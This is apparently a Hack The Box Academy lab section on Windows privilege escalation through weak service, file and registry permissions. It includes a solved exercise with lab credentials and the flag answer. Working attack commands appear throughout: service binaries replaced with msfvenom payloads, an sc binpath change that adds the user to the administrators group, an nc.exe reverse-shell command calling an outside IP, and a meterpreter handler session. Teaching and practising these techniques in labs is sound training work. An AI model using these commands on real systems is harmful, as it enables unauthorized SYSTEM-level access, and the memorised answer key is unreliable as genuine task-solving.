# Weak Permissions
## Permissive File System ACLs
### Running SharpUp
We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

The tool identifies the `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

### Checking Permissions with icacls
Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### Replacing Service Binary
This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`.

```cmd
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

## Weak Service Permissions
### Reviewing SharpUp Again
Let's check the SharpUp output again for any modifiable services. We see the WindscribeService is potentially misconfigured.

```cmd
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Checking Permissions with AccessChk
Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have **SERVICE_ALL_ACCESS** rights over the service, which means full read/write control over it.

```cmd
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

### Check Local Admin Group
Checking the local administrators group confirms that our user `htb-student` is not a member.

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
mrb3n
The command completed successfully.
```

### Changing the Service Binary Path
We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group.

```cmd
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

### Stopping Service
Next, we must stop the service, so the new binpath command will run the next time it is started.

```cmd
C:\htb> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

### Starting the Service
Since we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.

```cmd
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
```

The service did not respond to the start or control request in a timely fashion.

### Confirming Local Admin Group Addition
Finally, check to confirm that our user was added to the local administrators group.

```cmd
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
```

The command completed successfully.

## Weak Service Permissions - Cleanup
We can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.

```cmd
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
C:\htb> sc start WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1716
        FLAGS              :
C:\htb> sc query WindScribeService
 
SERVICE_NAME: WindScribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

## Unquoted Service Path
When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.

### Service Binary Path

```shellsession
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will attempt to load the following potential executables in order on service start, with a `.exe` being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

### Querying Service

```cmd
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.

- `C:\Program.exe\`
- `C:\Program Files (x86)\System.exe`

> However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.

### Searching for Unquoted Service Paths
We can identify unquoted service binary paths using the command below.

```cmd
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

## Permissive Registry ACLs
It is also worth searching for weak service ACLs in the Windows Registry. We can do this using accesschk.

### Checking for Weak Service ACLs in Registry

```cmd
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS

<SNIP>
```

### Changing ImagePath with PowerShell
We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:

```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary
### Check Startup Programs
We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```powershell
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.

## Questions
RDP to 10.129.43.44 (ACADEMY-WINLPE-WS01), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate privileges on the target host using the techniques demonstrated in this section. Submit the contents of the flag in the WeakPerms folder on the Administrator Desktop. **Answer: Aud1t_th0se_s3rv1ce_p3rms!**
   - Run SharpUp, identified `SecurityService` is modifiable:
        ```cmd
        C:\Tools>SharpUp.exe

        === SharpUp: Running Privilege Escalation Checks ===


        === Modifiable Services ===

        Name             : WindscribeService
        DisplayName      : WindscribeService
        Description      : Manages the firewall and controls the VPN tunnel
        State            : Running
        StartMode        : Auto
        PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


        === Modifiable Service Binaries ===

        Name             : SecurityService
        DisplayName      : PC Security Management Service
        Description      : Responsible for managing PC security
        State            : Stopped
        StartMode        : Auto
        PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
        ```
   - `SecurityService.exe` also has weak permission where `BUILTIN\Users` have full access on the service:
        ```cmd
        C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                            Everyone:(I)(F)
                                                            NT AUTHORITY\SYSTEM:(I)(F)
                                                            BUILTIN\Administrators:(I)(F)
                                                            APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                            APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
        ```
   - Generate a reverse shell, transfer to the target and replace the existing `SecurityService.exe`:
        ```sh
        $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.131 LPORT=1411 -f exe -o shell.exe
        ```
        ```cmd
        C:\Tools>curl -O http://10.10.15.131:8000/shell.exe
        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                        Dload  Upload   Total   Spent    Left  Speed
        100  7680  100  7680    0     0   7680      0  0:00:01 --:--:--  0:00:01 20480
        C:\Tools>copy /Y shell.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
        1 file(s) copied.
        ```
   - Start the service and catch the meterpreter shell using `msfconsole` to read the flag:
        ```cmd
        C:\Tools>sc start SecurityService
        ```
        ```sh
        $ msfconsole -q
        [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
        [*] Using configured payload generic/shell_reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
        payload => windows/x64/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.15.131
        LHOST => 10.10.15.131
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1411
        LPORT => 1411
        [msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
        [*] Started reverse TCP handler on 10.10.15.131:1411 
        [*] Sending stage (232006 bytes) to 10.129.43.44
        [*] Meterpreter session 1 opened (10.10.15.131:1411 -> 10.129.43.44:57003) at 2026-07-11 11:25:44 -0400
        (Meterpreter 1)(C:\WINDOWS\system32) > shell
        Process 5452 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.19042.985]
        (c) Microsoft Corporation. All rights reserved.

        C:\WINDOWS\system32>more C:\Users\Administrator\Desktop\WeakPerms\flag.txt
        Aud1t_th0se_s3rv1ce_p3rms!
        ```